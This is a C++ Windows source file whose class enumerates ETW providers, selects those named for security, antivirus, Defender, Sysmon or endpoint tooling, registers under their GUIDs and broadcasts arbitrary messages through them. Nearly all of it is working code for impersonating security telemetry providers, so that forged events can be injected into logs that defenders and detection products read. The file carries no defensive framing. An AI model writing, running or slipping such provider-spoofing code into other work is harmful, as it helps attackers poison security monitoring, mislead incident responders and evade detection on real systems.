#include <windows.h>
#include <tdh.h>
#include <evntprov.h>
#include <iostream>
#include <algorithm>
#include <vector>
#pragma comment(lib, "tdh.lib")
#pragma comment(lib, "advapi32.lib")

// Struct to store basic provider information
struct ProviderInfo {
    GUID guid;
    std::wstring name;
    std::wstring description;
};

// Class to manage ETW providers
class ETWProviderManager {
private:
    std::vector<ProviderInfo> availableProviders; // List of all discovered ETW providers
    std::vector<REGHANDLE> registeredHandles;     // Handles of registered providers

public:
    // Enumerate all ETW providers in the system
    bool EnumerateSystemProviders() {
        ULONG bufferSize = 0;
        PROVIDER_ENUMERATION_INFO* pProviders = nullptr;

        // First call to get required buffer size
        ULONG status = TdhEnumerateProviders(pProviders, &bufferSize);
        if (status != ERROR_INSUFFICIENT_BUFFER) {
            printf("TdhEnumerateProviders failed: %lu\n", status);
            return false;
        }

        // Allocate memory for providers
        pProviders = (PROVIDER_ENUMERATION_INFO*)malloc(bufferSize);
        if (!pProviders) {
            printf("Memory allocation failed\n");
            return false;
        }

        // Second call to actually get provider data
        status = TdhEnumerateProviders(pProviders, &bufferSize);
        if (status != ERROR_SUCCESS) {
            printf("TdhEnumerateProviders failed: %lu\n", status);
            free(pProviders);
            return false;
        }

        printf("Found %lu ETW providers in the system:\n\n", pProviders->NumberOfProviders);

        // Process each provider
        for (ULONG i = 0; i < pProviders->NumberOfProviders; i++) {
            TRACE_PROVIDER_INFO& provider = pProviders->TraceProviderInfoArray[i];

            ProviderInfo info;
            info.guid = provider.ProviderGuid;

            // Get provider name
            if (provider.ProviderNameOffset != 0) {
                info.name = (LPWSTR)((PBYTE)pProviders + provider.ProviderNameOffset);
            }
            else {
                info.name = L"Unknown";
            }

            availableProviders.push_back(info);

            // Print provider information
            printf("Provider %lu:\n", i + 1);
            printf("  GUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
                info.guid.Data1, info.guid.Data2, info.guid.Data3,
                info.guid.Data4[0], info.guid.Data4[1], info.guid.Data4[2], info.guid.Data4[3],
                info.guid.Data4[4], info.guid.Data4[5], info.guid.Data4[6], info.guid.Data4[7]);
            printf("  Name: %ls\n", info.name.c_str());

            // Only show the first 20 providers to avoid console clutter
            if (i >= 19) {
                printf("  ... and %lu more providers\n", pProviders->NumberOfProviders - 20);
                break;
            }
            printf("\n");
        }

        free(pProviders);
        return true;
    }

    // Register with popular ETW providers using their GUIDs
    bool RegisterAsPopularProviders(int maxProviders = 10) {
        printf("Attempting to register using existing popular provider GUIDs...\n\n");

        int registered = 0;
        for (size_t i = 0; i < availableProviders.size() && registered < maxProviders; i++) {
            const auto& provider = availableProviders[i];

            // Filter for providers with "important" names
            std::wstring lowerName = provider.name;
            std::transform(lowerName.begin(), lowerName.end(), lowerName.begin(), ::towlower);

            bool isImportant = lowerName.find(L"security") != std::wstring::npos ||
                lowerName.find(L"antivirus") != std::wstring::npos ||
                lowerName.find(L"defender") != std::wstring::npos ||
                lowerName.find(L"sysmon") != std::wstring::npos ||
                lowerName.find(L"endpoint") != std::wstring::npos;

            if (isImportant) {
                REGHANDLE handle;
                ULONG result = EventRegister(&provider.guid, nullptr, nullptr, &handle);

                if (result == ERROR_SUCCESS) {
                    registeredHandles.push_back(handle);
                    printf("Successfully registered as: %ls\n", provider.name.c_str());
                    printf("   GUID: {%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\n",
                        provider.guid.Data1, provider.guid.Data2, provider.guid.Data3,
                        provider.guid.Data4[0], provider.guid.Data4[1], provider.guid.Data4[2], provider.guid.Data4[3],
                        provider.guid.Data4[4], provider.guid.Data4[5], provider.guid.Data4[6], provider.guid.Data4[7]);
                    registered++;
                }
                else {
                    printf("Failed to register as: %ls (Error: %lu)\n", provider.name.c_str(), result);
                }
                printf("\n");
            }
        }

        printf("Successfully registered with %d popular provider GUIDs\n", registered);
        return registered > 0;
    }

    // Broadcast a custom event message to all registered providers
    void BroadcastEvent(const std::wstring& message) {
        if (registeredHandles.empty()) {
            printf("No providers registered for broadcasting\n");
            return;
        }

        EVENT_DATA_DESCRIPTOR eventData[1];
        EventDataDescCreate(&eventData[0], message.c_str(),
            (message.length() + 1) * sizeof(wchar_t));

        int successCount = 0;
        for (REGHANDLE handle : registeredHandles) {
            ULONG result = EventWrite(handle, nullptr, 1, eventData);
            if (result == ERROR_SUCCESS) {
                successCount++;
            }
        }

        printf("Broadcasted '%ls' to %d/%zu providers\n",
            message.c_str(), successCount, registeredHandles.size());
    }

    // Destructor to unregister all handles on cleanup
    ~ETWProviderManager() {
        for (REGHANDLE handle : registeredHandles) {
            EventUnregister(handle);
        }
    }
};
